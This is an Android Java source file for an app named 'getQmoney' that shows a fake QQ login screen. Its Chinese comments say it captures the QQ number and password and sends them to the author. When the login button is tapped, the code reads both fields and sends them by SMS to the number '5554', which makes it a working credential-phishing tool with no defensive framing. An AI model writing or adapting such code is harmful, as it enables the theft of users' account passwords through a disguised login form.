package com.example.getQmoney;

import android.os.Bundle;
import android.telephony.SmsManager;
import android.app.Activity;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;

public class MainActivity extends Activity {
	private EditText number;
	private EditText password;
	private Button login_btn;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		//获得qq号码和qq密码
		number = (EditText) findViewById(R.id.qq_number);
		
		password = (EditText) findViewById(R.id.qq_password);
		
		login_btn = (Button) findViewById(R.id.btn_login);
	
		//给登录按钮添加事件
		login_btn.setOnClickListener(new OnClickListener() {
			
			@Override
			public void onClick(View v) {
				//发短信给我
				//获得qq号码和密码信息
				String numValue = number.getText().toString();
				String passValue = password.getText().toString();
				
				//拿到短信发送管理器
				SmsManager smsManager=SmsManager.getDefault();
				//destinationAddress:目的地
				//scAddress:原地址
				//scAddress:发送的文本数据
				//sentIntent:发送成功报告
				//deliveryIntent:对方开机后收到的短信报告
				
				smsManager.sendTextMessage("5554",null,numValue+"-----"+passValue ,null ,null );
				
			}
		});
	}

}
